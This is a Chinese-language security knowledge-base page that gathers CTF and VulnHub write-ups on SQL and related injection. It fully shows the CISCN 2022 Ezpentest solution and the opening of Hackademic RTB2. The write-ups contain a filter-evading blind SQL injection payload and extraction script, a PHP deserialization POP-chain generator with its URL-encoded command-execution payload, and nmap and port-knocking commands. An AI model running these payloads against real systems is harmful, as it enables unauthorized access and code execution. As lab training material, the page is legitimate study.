---
title: SQL、NoSQL、HQL 与 XPath 注入
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/queries/
categories:
- Web安全
- 查询注入
tags:
- 知识库
- SQL注入
- MySQL
- Squid
- PHP
- POP链
- GC
- phpMyAdmin
- UDF
- CMS
- sudo
- udev
- 进程权限
description: 查询注入的可观察结果可能是返回内容、重定向、异常或时间差。本章汇总原文中的构造过程、字符过滤、数据库权限和应用调用，保留每种侧信道的请求与脚本。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

查询注入的可观察结果可能是返回内容、重定向、异常或时间差。本章汇总原文中的构造过程、字符过滤、数据库权限和应用调用，保留每种侧信道的请求与脚本。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/queries/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

Ezpentest 的 BIGINT 错误与 Mango 的 MongoDB 运算符采用不同判断条件。

Writer 逐步确认 UNION 位置并读取源码，Pandora 直接影响服务端会话。

Unbalanced 的 XPath、SkyTower 的过滤和多个历史 CMS 的数据库行为各自留有验证记录。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [BIGINT 错误侧信道与 PHP POP 链](#case-ciscn-2022-ezpentest) | ciscn-2022-ezpentest | SQL注入、PHP、POP链、GC |
| [注入、数据库文件写入与替代入口](#case-hackademic-rtb2) | Hackademic-RTB2 | SQL注入、MySQL、phpMyAdmin |
| [登录查询与 MySQL UDF 权限](#case-kioptrix4) | Kioptrix4 | SQL注入、MySQL、UDF |
| [CMS 查询与管理配置](#case-kvm3) | KVM3 | SQL注入、CMS、sudo |
| [SQL 数据到 udev 进程](#case-lampsecurity-ctf6) | LAMPSecurity-CTF6 | SQL注入、udev、进程权限 |
| [MongoDB 运算符与响应侧信道](#case-mango) | mango | NoSQL注入、MongoDB、响应侧信道 |
| [SNMP 凭据与控制台会话注入](#case-pandora) | pandora | SNMP、SQL注入、CVE-2021-32099 |
| [过滤差异与代理内 SSH](#case-skytower-1) | SkyTower-1 | SQL注入、Squid、受限Shell |
| [EncFS 配置与 XPath 查询](#case-unbalanced) | Unbalanced | XPath、EncFS、Squid |
| [OpenDocMan 参数与替代提权](#case-vulnos-2) | vulnos-2 | SQL注入、OpenDocMan、OverlayFS |
| [UNION 读取与应用命令边界](#case-writer) | writer | SQL注入、Python、邮件、APT |

<a id="case-ciscn-2022-ezpentest"></a>

## BIGINT 错误侧信道与 PHP POP 链

原文用 BIGINT 溢出区分响应，再还原 phpjiami 代码并分析 autoload 与 GC 触发顺序。盲注和对象链分别保留完整输入与脚本。

<p class="kb-provenance">来源 ciscn-2022-ezpentest · 原记录 2023-06-29 · 17 个代码块 · 5 处图片引用</p>

<details class="kb-evidence" id="record-ciscn-2022-ezpentest">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start ciscn-2022-ezpentest -->

#### 介绍

最近在ichunqiu CTF大本营刷题的时候碰到一道高质量的web题，比赛中还算是web里难度比较大的。网上已经有很多公开的writeup，但是为了加深理解记忆，故记录一篇blog。

 - 复现链接: [第十五届全国大学生信息安全竞赛——创新实践能力赛 Ezpentest](https://www.ichunqiu.com/battalion?t=1&r=72291)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/ezpentest2.png)



#### sql盲注绕正则

waf:

``` bash
<?php
function safe($a) {
    $r = preg_replace('/[\s,()#;*~\-]/','',$a);
    $r = preg_replace('/^.*(?=union|binary|regexp|rlike).*$/i','',$r);
    return (string)$r;
  }
?>
```

构造payload:

``` bash
"xxx'||case'1'when`username`like'{}%'COLLATE`utf8mb4_0900_bin`then+9223372036854775807+1+''else'1'end||'xxx"
```

 - 因为过滤了空格和其他空白字符，有因为case和then之间必须有空格，所以使用'1'。而且分号内的字符必须为数字且不为0，这样case when才能正常发挥作用

 - 利用like去正则匹配username这一列的数据，如果匹配到就返回9223372036854775807+1 这个表达式，而这个表示执行后会导致数据溢出，服务器会报500，否则就返回'1'，服务器会报error

 - +''是因为过滤了空白符号，所以用来连接起sql语句的，这里的数据溢出同样可以用18446744073709551615+1，这个18446744073709551615的值其实就是~0，也就是说这个payload其实就是~0+1

 - 参考[MySQL 的 BIGINT 报错注入](https://www.tr0y.wang/2018/06/18/MySQL%E7%9A%84BIGINT%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/)

 - utf8mb4_0900_bin是用来区分大小写的，因为like正则匹配是不区分大小写的

 - case用来解决优先级问题

 - 盲注脚本 (python2):

``` bash
import requests

burp0_url = "http://eci-2ze2replbpornl6bilrn.cloudeci1.ichunqiu.com/login.php"
burp0_cookies = {"PHPSESSID": "gmqmv74c2fq6s65mqi8kk4q02h"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://eci-2ze2replbpornl6bilrn.cloudeci1.ichunqiu.com/", "Connection": "close", "Referer": "http://eci-2ze2replbpornl6bilrn.cloudeci1.ichunqiu.com/", "Upgrade-Insecure-Requests": "1"}

flag = ''
black_list = ",()#;*~\-'"

while True:
    for j in range(33, 128):
        if chr(j) in black_list:
            continue

        if j == 95 or j == 37:
            y = '\\' + chr(j)
        else:
            y = chr(j)
        burp0_data = {
            "username": "xxx'||case'1'when`username`like'{}%'COLLATE`utf8mb4_0900_bin`then+9223372036854775807+1+''else'1'end||'xxx".format(
                flag + y),
            "password": "aaa"}
        res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        print chr(j) + " : " + str(res.status_code)
        if res.status_code == 500:
            if j == 95 or j == 37:
                flag += '\\' + chr(j)
            else:
                flag += chr(j)
            print flag
            break
        if j == 127:
            print flag.replace("\\", '')
            exit(0)
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/ezpentest.png)

跑密码时，把脚本里的username改成password即可

``` bash
burp0_data = {
    "username": "xxx'||case'1'when`password`like'{}%'COLLATE`utf8mb4_0900_bin`then+9223372036854775807+1+''else'1'end||'xxx".format(
        flag + y),
    "password": "aaa"}
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/ezpentest1.png)

 - 得到账号密码

```
账号：nssctfwabbybaboo!@$%!!
密码：PAssw40d_Y0u3_Never_Konwn!@!!
```

成功登录

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/ezpentest3.png)

#### 解phpjiami混淆

登陆后发现混淆代码，提示有一个1Nd3x_Y0u_N3v3R_Kn0W.php，直接访问这个文件

``` bash
<?php
class A
{
    public $a;
    public $b;
    public function see()
    {
        $b = $this->b;
        $checker = new ReflectionClass(get_class($b));
        if(basename($checker->getFileName()) != 'SomeClass.php'){
            if(isset($b->a)&&isset($b->b)){
                ($b->a)($b->b."");
            }
        }
    }
}
class B
{
    public $a;
    public $b;
    public function __toString()
    {
        $this->a->see();
        return "1";
    }
}
class C
{
    public $a;
    public $b;
    public function __toString()
    {
        $this->a->read();
        return "lock lock read!";
    }
}
class D
{
    public $a;
    public $b;
    public function read()
    {
        $this->b->learn();
    }
}
class E
{
    public $a;
    public $b;
    public function __invoke()
    {
        $this->a = $this->b." Powered by PHP";
    }
    public function __destruct(){
        //eval($this->a); ??? 吓得我赶紧把后门注释了
        //echo "???";
        die($this->a);
    }
}
class F
{
    public $a;
    public $b;
    public function __call($t1,$t2)
    {
        $s1 = $this->b;
        $s1();
    }
}

?>
```

主页面本身是一段混淆之后的代码，查看源码发现是由phpjiami混淆

使用python3的pwntools+gzip库将页面保存为pop.php

``` bash
import gzip
from pwn import *
import time

p = remote("eci-2zedg0a5ogrt1nxd4li0.cloudeci1.ichunqiu.com", 80)
msg = """POST /login.php HTTP/1.1
Host: eci-2zedg0a5ogrt1nxd4li0.cloudeci1.ichunqiu.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Origin: http://eci-2zedg0a5ogrt1nxd4li0.cloudeci1.ichunqiu.com
Connection: close
Referer: http://eci-2zedg0a5ogrt1nxd4li0.cloudeci1.ichunqiu.com/
Cookie: PHPSESSID=ur039pnm15u784vdnh6gdg13er
Upgrade-Insecure-Requests: 1

username=awk785969awlfjnlkjlii%21%40%24%25%21%21&password=PAssw40d_Y0u3_Never_Konwn%21%40%21%21"""
p.send(msg.encode())
time.sleep(1)
byte = p.recv()
start = byte.find(b"\r\n\r\n") + 4
byte = byte[start:]
with open("pop.php", "wb") as f:
    f.write(gzip.decompress(byte))
    f.close()
```

然后使用以下解密脚本

 - [phpjiami网站解密脚本](https://github.com/wenshui2008/phpjiami_decode)

``` bash
root@fdvoid0:/mnt/d/1.online-ctfs/ichunqiu/15th/Ezpentest/phpjiami_decode-master# php phpjiami.php
﻿./encode/pop.php<br>
```

解密后:

``` bash
<?php
session_start();
if(!isset($_SESSION['login'])){
    die();
}
function Al($classname){
    include $classname.".php";
}

if(isset($_REQUEST['a'])){
    $c = $_REQUEST['a'];
    $o = unserialize($c);
    if($o === false) {
        die("Error Format");
    }else{
        spl_autoload_register('Al');
        $o = unserialize($c);
        $raw = serialize($o);
        if(preg_match("/Some/i",$raw)){
            throw new Error("Error");
        }
        $o = unserialize($raw);
        var_dump($o);
    }
}else {
    echo file_get_contents("SomeClass.php");
}

```

spl_autoload_register的作用就是把后面反序列化不存在的类所在的文件加载进来，具体的原理可以参考这个文章:

 - [关于PHP中spl_autoload_register()函数用法详解](https://www.php.cn/php-weizijiaocheng-400053.html)

当不带传参数a访问1Nd3x_Y0u_N3v3R_Kn0W.php这个文件就能拿到了SomeClass.php的文件内容

#### 反序列化POP链构造(php GC回收机制)

POP链也很简单，die里面是字符串处理的，让a为对象会触发__toString方法

``` bash
E::__destruct()
↓↓↓
B::__toString()
↓↓↓
A::see()
```

``` bash
class E
{
    public $a;
    public $b;
    public function __invoke()
    {
        $this->a = $this->b." Powered by PHP";
    }
    public function __destruct(){
        //eval($this->a); ??? 吓得我赶紧把后门注释了
        //echo "???";
        die($this->a);
    }
}
```

利用这个类的__toString方法

``` bash
class B
{
    public $a;
    public $b;
    public function __toString()
    {
        $this->a->see();
        return "1";
    }
}
```

然后到see()这个类，这里只需要让b为原生类，a参数和b参数都是可控的就可以rce了

``` bash
class A
{
    public $a;
    public $b;
    public function see()
    {
        $b = $this->b;
        $checker = new ReflectionClass(get_class($b));
        if(basename($checker->getFileName()) != 'SomeClass.php'){
            if(isset($b->a)&&isset($b->b)){
                ($b->a)($b->b."");
            }
        }
    }
}
```

链子的触发点就是刚刚那个1Nd3x_Y0u_N3v3R_Kn0W.php文件，但是这里如果我们想把那个可以rce的文件包含进来的，就要创建的是一个SomeClass的类，但是这里是会进行过滤的。

``` bash
if(preg_match("/Some/i",$raw)){
    throw new Error("Error");
}
```

这样如果我们包含这个类，就会抛出错误从而终止程序，使__destruct()无法执行，这样我们的链子就没有用了。
所以我们要提前调用__destruct(),在包含SomeClass类的同时就进入__destruct()，使用gc回收机制来提前触发__destruct()

***PHP Garbage Collection简称GC，又名垃圾回收，在PHP中使用引用计数和回收周期来自动管理内存对象的。
垃圾，顾名思义就是一些没有用的东西。在这里指的是一些数据或者说是变量在进行某些操作后被置为空(NULL)或者是没有地址(指针)的指向，这种数据一旦被当作垃圾回收后就相当于把一个程序的结尾给划上了句号，那么就不会出现无法调用__destruct()方法了***

 - [浅析GC回收机制与phar反序列化](http://arsenetang.com/2021/11/28/%E6%B5%85%E6%9E%90GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)

把i本应该等于1修改为i = 0。就是把i = 0指向NULL了，从而实现了GC回收。

其实还有一种方法提前进入destrust的，就是利用fastdestrust，就传一个损坏的序列化数据就行了，比如O:6:"person":3:{s:4:"name";N;s:3:"age";i:19;s:3:"sex";N;，就是把后面 } 的符号去掉就行，但是这里有对序列化数据格式正确与否进行校验，所以这里采用的是gc回收机制

 - rce.php

``` bash
<?php

class A
{
    public $a;
    public $b;
    public function see()
    {
        $b = $this->b;
        $checker = new ReflectionClass(get_class($b));
        if(basename($checker->getFileName()) != 'SomeClass.php'){
            if(isset($b->a)&&isset($b->b)){
                ($b->a)($b->b."");
            }
        }
    }
}
class B
{
    public $a;
    public $b;
    public function __toString()
    {
        $this->a->see();
        return "1";
    }
}
class C
{
    public $a;
    public $b;
    public function __toString()
    {
        $this->a->read();
        return "lock lock read!";
    }
}
class D
{
    public $a;
    public $b;
    public function read()
    {
        $this->b->learn();
    }
}
class E
{
    public $a;
    public $b;
    public function __invoke()
    {
        $this->a = $this->b." Powered by PHP";
    }
    public function __destruct(){
        die($this->a);
    }
}
class F
{
    public $a;
    public $b;
    public function __call($t1,$t2)
    {
        $s1 = $this->b;
        $s1();
    }
}

class SomeClass{
    public $a;
}

$e = new E();
$a = new A();
$b = new B();

$e->a = $b;
$b->a = $a;
$arr = new ArrayObject();//换其他原生类都行error啥的都可以
$arr->a = "system";
$arr->b = "cat /flag.txt";
$a->b = $arr;
$c = new SomeClass();
$c->a = $e;
echo urlencode(str_replace("i:1;", "i:0;", serialize(array($c,1))));
```

生成rce chain

``` bash
root@fdvoid0:/mnt/d/1.online-ctfs/ichunqiu/15th/Ezpentest# php rce.php
a%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SomeClass%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22E%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A2%3A%7Bs%3A1%3A%22a%22%3BN%3Bs%3A1%3A%22b%22%3BC%3A11%3A%22ArrayObject%22%3A71%3A%7Bx%3Ai%3A0%3Ba%3A0%3A%7B%7D%3Bm%3Aa%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A6%3A%22system%22%3Bs%3A1%3A%22b%22%3Bs%3A13%3A%22cat+%2Fflag.txt%22%3B%7D%7D%7Ds%3A1%3A%22b%22%3BN%3B%7Ds%3A1%3A%22b%22%3BN%3B%7D%7Di%3A0%3Bi%3A0%3B%7D
```

访问以下url，获取flag:

``` bash
http://eci-2zedg0a5ogrt1nxd4li0.cloudeci1.ichunqiu.com/1Nd3x_Y0u_N3v3R_Kn0W.php?a=a%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SomeClass%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22E%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A2%3A%7Bs%3A1%3A%22a%22%3BN%3Bs%3A1%3A%22b%22%3BC%3A11%3A%22ArrayObject%22%3A71%3A%7Bx%3Ai%3A0%3Ba%3A0%3A%7B%7D%3Bm%3Aa%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A6%3A%22system%22%3Bs%3A1%3A%22b%22%3Bs%3A13%3A%22cat+%2Fflag.txt%22%3B%7D%7D%7Ds%3A1%3A%22b%22%3BN%3B%7Ds%3A1%3A%22b%22%3BN%3B%7D%7Di%3A0%3Bi%3A0%3B%7D
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/ezpentest4.png)


#### 参考链接
 - [[2022 CISCN]初赛 web题目复现 ezpentest](https://blog.csdn.net/cosmoslin/article/details/125598409?spm=1001.2101.3001.6650.10&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-10-125598409-blog-125064802.235%5Ev38%5Epc_relevant_anti_vip_base&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-10-125598409-blog-125064802.235%5Ev38%5Epc_relevant_anti_vip_base&utm_relevant_index=11)
 - [2022 CISCN Web Ezpentest 详解](https://mp.weixin.qq.com/s/vTF9ArXKp4RCFQPl6mOGkA)
 - [CISCN2022 Ezpentest Writeup](https://erroratao.github.io/2022/05/30/CISCN2022_Ezpentest/)
 - [[CISCN 2022 初赛]ezpentest](https://blog.csdn.net/weixin_52585514/article/details/125985176)
 - [浅析GC回收机制与phar反序列化](http://arsenetang.com/2021/11/28/%E6%B5%85%E6%9E%90GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)
 - [CISCN(Web Ezpentest)GC、序列化、case when](https://blog.csdn.net/qq_62046696/article/details/129072803)
 - [CISCN 2022 初赛 web 复现 ezpentest](https://blog.csdn.net/shinygod/article/details/127866492)
 - [ciscn2022 Ezpentest](https://www.viewofthai.link/2022/06/05/%E5%9B%BD%E8%B5%9B-%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B-ciscn-2022-web-%E9%83%A8%E5%88%86wp/)

<!-- kb:end ciscn-2022-ezpentest -->

</details>

<a id="case-hackademic-rtb2"></a>

## 注入、数据库文件写入与替代入口

SQL 注入、phpMyAdmin 和 Web 上传构成不同入口分支。保留端口重新扫描、数据库权限及各自取得执行的方式。

<p class="kb-provenance">来源 Hackademic-RTB2 · 原记录 2019-12-12 · 20 个代码块 · 5 处图片引用</p>

<details class="kb-evidence" id="record-hackademic-rtb2">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start Hackademic-RTB2 -->

名称：Hackademic: RTB2
发布日期：2011年9月6日

#### 下载

 - Download (Mirror): [https://download.vulnhub.com/hackademic/Hackademic.RTB2.zip](https://download.vulnhub.com/hackademic/Hackademic.RTB2.zip)
 - Download (Torrent): [https://download.vulnhub.com/hackademic/Hackademic.RTB2.zip.torrent](https://download.vulnhub.com/hackademic/Hackademic.RTB2.zip.torrent)

描述：

这是mr.pr0n提出的第二个现实黑客攻击挑战
下载目标并获得root。
毕竟，尝试读取根目录中文件“ key.txt”的内容。
请享用！

漏洞：

 - 纯文本密码
 - 特权提升
 - SQL注入
 - 不受限制地上传危险类型的文件



#### 信息收集

老规矩上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.84.0/24
Nmap scan report for 192.168.84.142
Host is up (0.00022s latency).
MAC Address: 00:0C:29:74:B5:21 (VMware)

root@kali:~# nmap -A -v -sS -Pn -T4 --script=vuln 192.168.84.142
80/tcp  open     http    Apache httpd 2.2.14 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.84.142
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.84.142:80/
|     Form id: username
|_    Form action: check.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /phpmyadmin/: phpMyAdmin
|   /icons/: Potentially interesting folder w/ directory listing
|_  /index/: Potentially interesting folder
|_http-server-header: Apache/2.2.14 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:apache:http_server:2.2.14: 
|       CVE-2010-0425   10.0    https://vulners.com/cve/CVE-2010-0425
|       CVE-2011-3192   7.8     https://vulners.com/cve/CVE-2011-3192
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249
|       CVE-2012-0883   6.9     https://vulners.com/cve/CVE-2012-0883
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862
|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231
|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098
|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438
|       CVE-2012-4557   5.0     https://vulners.com/cve/CVE-2012-4557
|       CVE-2011-3368   5.0     https://vulners.com/cve/CVE-2011-3368
|       CVE-2010-2068   5.0     https://vulners.com/cve/CVE-2010-2068
|       CVE-2010-1452   5.0     https://vulners.com/cve/CVE-2010-1452
|       CVE-2010-0408   5.0     https://vulners.com/cve/CVE-2010-0408
|       CVE-2012-0031   4.6     https://vulners.com/cve/CVE-2012-0031
|       CVE-2011-3607   4.4     https://vulners.com/cve/CVE-2011-3607
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896
|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558
|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499
|       CVE-2012-0053   4.3     https://vulners.com/cve/CVE-2012-0053
|       CVE-2011-4317   4.3     https://vulners.com/cve/CVE-2011-4317
|       CVE-2011-3639   4.3     https://vulners.com/cve/CVE-2011-3639
|       CVE-2011-3348   4.3     https://vulners.com/cve/CVE-2011-3348
|       CVE-2011-0419   4.3     https://vulners.com/cve/CVE-2011-0419
|       CVE-2010-0434   4.3     https://vulners.com/cve/CVE-2010-0434
|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
|       CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687
|_      CVE-2011-4415   1.2     https://vulners.com/cve/CVE-2011-4415
666/tcp filtered doom
```

经过尝试发现80端口没有什么好东西，666端口被过滤,源代码中没有任何内容，可疑标头，登录中没有sql注入。 我在目标上运行了OpenVAS，Dirbuster和Nikto，但是除了Phpmyadmin界面外，什么都没有发现，无论执行什么操作，该界面始终使我“无法连接到MySQL服务器”错误。 我以为Web服务器可能是一个错误的前端，而这可能是机器上隐藏的其他东西，所以接下来我运行了UDP扫描，它显示了一个附加端口：

``` bash
root@kali:~# nmap -sU -F -n -T4 -v 192.168.84.142
5353/udp  open          zeroconf
```

在http://192.168.84.143/登陆页面输入' or 1=1--'  ///  ' or 1=1--'发现返回了一个页面其中有Ok, nice shot...
...but, you are looking in a wrong place bro! ;-),直接右键查看源代码，发现异常字符串

``` bash
%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%20%30%64%20%30%61%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%36%39%20%36%65%20%32%37%20%32%30%20%36%66%20%36%65%20%32%30%20%36%38%20%36%35%20%36%31%20%37%36%20%36%35%20%36%65%20%32%37%20%37%33%20%32%30%20%36%34%20%36%66%20%36%66%20%37%32%20%32%30%20%32%65%20%32%65%20%32%30%20%33%61%20%32%39%20%30%64%20%30%61%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%30%64%20%30%61%20%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%0A
```

先url解码

``` bash
3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e 0d 0a 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 69 6e 27 20 6f 6e 20 68 65 61 76 65 6e 27 73 20 64 6f 6f 72 20 2e 2e 20 3a 29 0d 0a 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 0d 0a 3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e
```

再hex解码

``` bash
< - - - - - - - - - > 
 
 K n o c k   K n o c k   K n o c k i n '   o n   h e a v e n ' s   d o o r   . .   : ) 
 
 0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1 
 
 < - - - - - - - - - >
```

再二进制解码,[SNEAK: Snarkles.Net Encryption Assortment Kit - Version 1.28](http://www.snarkles.net/scripts/sneak/sneak.php),得到

``` bash
1001:1101:1011:1001
```

看来是做了端口碰撞措施，端口碰撞的主要目的是通过进行端口扫描来防止攻击者扫描系统以寻找可能被利用的服务，因为除非攻击者发送正确的碰撞顺序，否则受保护的端口将显得关闭。编写下列bash脚本打开666端口

``` bash
#!/bin/bash
for i in 1001 1101 1011 1001
do
nc 192.168.84.143 80 $i
done
```

运行脚本，稍等片刻端口即可打开


``` bash
root@kali:~# ./knock.sh
```

进一步的版本扫描表明这是多播DNS协议。找不到任何可利用的东西。再次使用详细标志和--packet-trace选项运行Nmap，这一次它返回了一个新端口：

``` bash
nmap -A -v -sS -Pn -T4 --packet-trace 192.168.84.142

NSE: TCP 192.168.84.135:52112 > 192.168.84.142:666 | CLOSE
NSOCK INFO [20.7300s] nsock_iod_delete(): nsock_iod_delete (IOD #70)
NSE: TCP 192.168.84.135:41738 > 192.168.84.142:80 | CLOSE
NSOCK INFO [20.7300s] nsock_iod_delete(): nsock_iod_delete (IOD #71)
Completed NSE at 02:17, 0.10s elapsed
Initiating NSE at 02:17
Completed NSE at 02:17, 0.00s elapsed
Nmap scan report for 192.168.84.142
Host is up (0.00049s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.2.14 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.14 (Ubuntu)
|_http-title: Hackademic.RTB2
666/tcp open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-generator: Joomla! 1.5 - Open Source Content Management
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 14 disallowed entries 
